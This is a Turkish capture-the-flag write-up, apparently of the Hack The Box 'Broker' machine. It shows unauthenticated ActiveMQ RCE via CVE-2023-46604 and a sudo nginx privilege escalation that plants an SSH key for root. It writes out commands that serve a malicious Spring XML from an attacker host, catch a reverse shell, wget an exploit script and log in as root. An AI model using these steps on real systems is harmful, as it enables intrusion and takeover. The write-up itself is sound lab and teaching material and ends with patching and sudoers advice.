<img width="1032" height="928" alt="broker" src="https://github.com/user-attachments/assets/70b96d2d-e4ee-4788-ac2c-d29c5c0e32be" />

### About

Broker is an easy difficulty `Linux` machine hosting a version of `Apache ActiveMQ`. Enumerating the version of `Apache ActiveMQ` shows that it is vulnerable to `Unauthenticated Remote Code Execution`, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `activemq` user to execute `sudo /usr/sbin/nginx`, which is similar to the recent `Zimbra` disclosure and is leveraged to gain `root` access.

### 1. Keşif

```bash
nmap -sS -A -T5 -p- 10.129.230.87
```

Sonuç oldukça kalabalık 

<img width="1053" height="832" alt="nmap" src="https://github.com/user-attachments/assets/0d0adaab-cdc1-441b-8329-d411b8ab6df4" />

<img width="515" height="26" alt="nmap2" src="https://github.com/user-attachments/assets/8087e835-4c29-45ce-b16e-dba6458ca380" />

61616'daki `ActiveMQ OpenWire transport 5.15.15` banner'ı tek başına yeterince konuşkan — bu versiyon, bilinen ve kritik bir RCE zincirine sahip.

### 2. Web Servisi ve ActiveMQ Console

<img width="876" height="441" alt="site1" src="https://github.com/user-attachments/assets/f62d64e8-dd89-4505-9a8f-e000771f0b88" />

80. porta gittiğimizde `ActiveMQRealm` realm'ıyla bir Basic Auth diyaloğu karşılıyor bizi. `admin:admin` deneyip doğrudan içeri giriyoruz — ActiveMQ'nun web konsolunda varsayılan kimlik bilgilerinin değiştirilmemesi, bu box'ta ikinci bir zafiyet gibi dursa da asıl kritik açık zaten kimlik doğrulama gerektirmiyor. Konsol bize broker'ın tam sürümünü (`5.15.15`) doğruluyor.

<img width="680" height="645" alt="site2" src="https://github.com/user-attachments/assets/9be7cf46-0c9e-4aac-9d70-21559f2df31c" />

### 3. Foothold — CVE-2023-46604

61616 portundaki OpenWire protokolü, ActiveMQ'nun kendi ikili (binary) mesajlaşma protokolüdür ve mesajları **marshalling/unmarshalling** ile serileştirir. CVE-2023-46604'ün kökü burada: `BaseDataStreamMarshaller` sınıfı, gelen bir `ExceptionResponse` paketini işlerken, paket içinde taşınan **sınıf ismini reflection ile doğrudan instantiate ediyor** — hangi sınıfın oluşturulacağı sunucu tarafından sabitlenmemiş, saldırganın gönderdiği veriden okunuyor. Kimlik doğrulama katmanı bu noktaya hiç girmiyor, çünkü OpenWire seviyesindeki mesaj işleme, HTTP/Basic Auth'un tamamen dışında, ham TCP soketi üzerinde gerçekleşiyor.

Gerçek silah burada `Class` isminin kendisi değil, seçilen **gadget**. Kullanılan zincir `org.springframework.context.support.ClassPathXmlApplicationContext` — bu sınıfın constructor'ı, kendisine verilen path/URL'i bir Spring bean XML tanım dosyası olarak yorumlayıp uzaktan çekiyor ve içindeki bean tanımlarını **anında instantiate ediyor.** Attacker-controlled bir XML içinde `<bean class="org.springframework.context.support.FileSystemXmlApplicationContext">` ya da doğrudan bir `ProcessBuilder`/`Runtime.exec()` çağrısı tanımlanırsa, bean'in constructor'ı çalıştığı an komut çalışır — deserialization'ın "veri okuma" değil "kod çalıştırma" haline gelmesinin klasik yolu.

```bash
python3 generate_poc.py -i 10.10.14.187 -p 1001
```

Bu adım, saldırgan makinesinin dinleyeceği IP/portu (`1001`) gömen bir reverse shell komutunu, yukarıdaki Spring context XML'inin içine yerleştiriyor ve `poc-linux.xml` olarak yazıyor.

```bash
python3 -m http.server 2002
python3 main.py -i 10.129.230.87 -u http://10.10.14.187:2002/poc-linux.xml
```

`main.py`, hedefin 61616 portuna doğrudan OpenWire seviyesinde bağlanıp, marshalling katmanını istismar eden ham paketi gönderiyor — payload'ın merkezinde `org.springframework.context.support.ClassPathXmlApplicationContext` sınıf ismi ve bizim HTTP sunucumuzda barındırdığımız XML'in URL'i base64/hex olarak kodlanmış halde taşınıyor. ActiveMQ bu paketi aldığı anda XML'i çekiyor, Spring context'i inşa ediyor, context inşası sırasında bizim komutumuz çalışıyor.

```
nc -nvlp 1001
connect to [10.10.14.187] from (UNKNOWN) [10.129.230.87] 42702
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

Broker process'i `activemq` kullanıcısı yetkisiyle çalıştığı için, elde ettiğimiz shell doğrudan bu kullanıcı bağlamında.

```
activemq@broker:~$ cat user.txt
35aa58f0993e0867e3daef939ccf22ee
```

### 4. Privilege Escalation — nginx Sudo Misconfiguration

```
activemq@broker:~$ sudo -l
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Kural burada tek bir binary'ye izin veriyor gibi görünse de, **hiçbir argüman kısıtlaması yok** — ve nginx, `-c` parametresiyle keyfi bir konfigürasyon dosyası kabul eden bir binary. Root yetkisiyle çalışacak bir web sunucusunu, **kendi yazdığımız config ile** başlatabiliyoruz demek, fiilen root context'inde dosya sistemi üzerinde işlem yaptırabileceğimiz anlamına geliyor. Bu, About kısmında referans verilen Zimbra advisory'siyle birebir aynı mantık: sudo kuralı komutu kısıtlıyor ama komutun **davranışını belirleyen konfigürasyonu** kısıtlamıyor.

`DylanGrl/nginx_sudo_privesc` script'i bu boşluğu otomatikleştiriyor: bir SSH anahtar çifti üretip, nginx'i root yetkisiyle, **kendi ürettiğimiz public key'i root'un `authorized_keys` dosyasına yazacak şekilde** ayarlanmış bir config ile başlatıyor. Mekanizma özünde bir log/response yazma primitifinin dosya sistemi üzerinde keyfi konuma yönlendirilmesi — nginx'in `root`/`alias` ve log directive'lerinin, sudo ile root yetkisi kazanan bir process içinde **erişim kontrolü dışında** kalan dosya yollarına yazma imkânı sunması.

```bash
wget http://10.10.14.187:8000/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

```
activemq@broker:~/.ssh$ ls
id_rsa  id_rsa.pub
```

Script çalıştıktan sonra kendi `.ssh` dizinimizde bir anahtar çifti buluyoruz — bu, root'un `authorized_keys`'ine enjekte edilen public key'in eşi. Private key'i Kali tarafına taşıyıp izinlerini düzeltmemiz yeterli:

```bash
nano root_key
chmod 600 root_key
ssh -i root_key root@10.129.230.87
```

```
root@broker:~# cat root.txt
2b52eb54831f5f7b5c2098bf30abaa4e
```

---

### Özet

Zincir iki bağımsız zafiyetin üst üste gelmesinden oluşuyor: **CVE-2023-46604**, OpenWire protokolünün marshalling katmanında sınıf isminin kimlik doğrulaması olmadan reflection'a taşınabilmesinden doğuyor — Spring'in `ClassPathXmlApplicationContext` gadget'ı ile bu, doğrudan uzaktan kod çalıştırmaya dönüşüyor. Privesc tarafında ise klasik bir "izin verilen binary, ama kısıtlanmamış argüman/config" hatası var — sudo kuralı `nginx`'in **hangi haklarla** çalışacağını belirlemiş ama **nasıl davranacağını** hiç sınırlamamış, bu da root context'inde keyfi dosya yazımına (authorized_keys enjeksiyonu) kadar uzanıyor. Kalıcı çözüm: ActiveMQ'nun 5.15.16/5.16.7 ve üzeri yamalı sürümlere güncellenmesi ve OpenWire portunun güvenilmeyen ağlara kapatılması; sudoers kurallarının binary bazında değil, **sabit argüman/config path'i bazında** (`Cmnd_Alias` + `!/usr/sbin/nginx -c *` gibi negatif kurallar veya doğrudan sabit config dosyası) tanımlanması.
